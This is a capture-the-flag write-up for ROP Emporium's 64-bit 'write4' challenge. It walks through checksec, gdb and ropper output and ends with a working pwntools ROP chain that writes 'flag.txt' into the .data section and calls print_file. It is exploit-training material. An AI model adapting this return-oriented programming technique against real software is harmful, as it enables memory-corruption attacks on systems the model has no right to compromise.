## 64 bits

```
$ checksec write4
[*] '/home/localuser/ropemporium/write4/64bits/write4'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
 ```
 
 Running the binary:
 
 ```
 $ ./write4 
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

> test
Thank you!
 ```
 
 Now I'll open it on gdb and see the functions:
 
 ```
 pwndbg> info func
All defined functions:

Non-debugging symbols:
0x00000000004004d0  _init
0x0000000000400500  pwnme@plt
0x0000000000400510  print_file@plt
0x0000000000400520  _start
0x0000000000400550  _dl_relocate_static_pie
0x0000000000400560  deregister_tm_clones
0x0000000000400590  register_tm_clones
0x00000000004005d0  __do_global_dtors_aux
0x0000000000400600  frame_dummy
0x0000000000400607  main
0x0000000000400617  usefulFunction
0x0000000000400628  usefulGadgets
0x0000000000400630  __libc_csu_init
0x00000000004006a0  __libc_csu_fini
0x00000000004006a4  _fini
 ```
 
 The `main` function calls the `pwnme` function:
 
 ```
 pwndbg> disassemble pwnme
Dump of assembler code for function pwnme@plt:
   0x0000000000400500 <+0>:     jmp    QWORD PTR [rip+0x200b12]        # 0x601018 <pwnme@got.plt>
   0x0000000000400506 <+6>:     push   0x0
   0x000000000040050b <+11>:    jmp    0x4004f0
End of assembler dump.
 ```
 
 `pwnme` it's at plt, and there's `usefulGadgets` and `usefulFunction`:
 
 ```
 pwndbg> disassemble usefulGadgets 
Dump of assembler code for function usefulGadgets:
   0x0000000000400628 <+0>:     mov    QWORD PTR [r14],r15
   0x000000000040062b <+3>:     ret    
   0x000000000040062c <+4>:     nop    DWORD PTR [rax+0x0]
End of assembler dump.
pwndbg> disassemble usefulFunction 
Dump of assembler code for function usefulFunction:
   0x0000000000400617 <+0>:     push   rbp
   0x0000000000400618 <+1>:     mov    rbp,rsp
   0x000000000040061b <+4>:     mov    edi,0x4006b4
   0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:    nop
   0x0000000000400626 <+15>:    pop    rbp
   0x0000000000400627 <+16>:    ret    
End of assembler dump.
 ```
 
 Now i'll use ropper to find useful gadgets, and those are the importants:
 
 ```
 $ ropper                                                                                                                                   
(ropper)> file write4
(write4/ELF/x86_64)> gadgets
----
----
0x0000000000400690: pop r14; pop r15; ret;
0x0000000000400693: pop rdi; ret;
----
----
 ```

 
 Now we need somewhere to write, let's find it with `obdjump`:
 
 ```
 $ objdump -h write4
 -----
 -----
 -----
 22 .data         00000010  0000000000601028  0000000000601028  00001028  2**3
----
----
 ```
 
 I'll use `.data` but `.bss` will work too.
 
 So what we are going to do is send the padding then with the gadget `pop r14; pop r15`, we change the value of r14 to the data and the r15 the `flag.txt` string, then with the gadget `pop rdi`, the new value of rdi is going to be flag.txt, and then we call the `print_file` function to get the flag
 
 The final exploit:
 
 ```
 from pwn import *

p = process("./write4")
elf = ELF("./write4")

# gadgets:
pop_r14_r15 = p64(0x400690) 
mov_r14_r15 = p64(0x400628) 
print_file = p64(0x400510)
pop_rdi = p64(0x400693)
data = p64(0x601028)


payload = b"a"*40
payload += pop_r14_r15
payload += data
payload += b"flag.txt"
payload += mov_r14_r15
payload += pop_rdi
payload += data
payload += print_file

p.recvuntil(">")
p.sendline(payload)
p.recvline()
p.interactive()
 ```
 
 
 
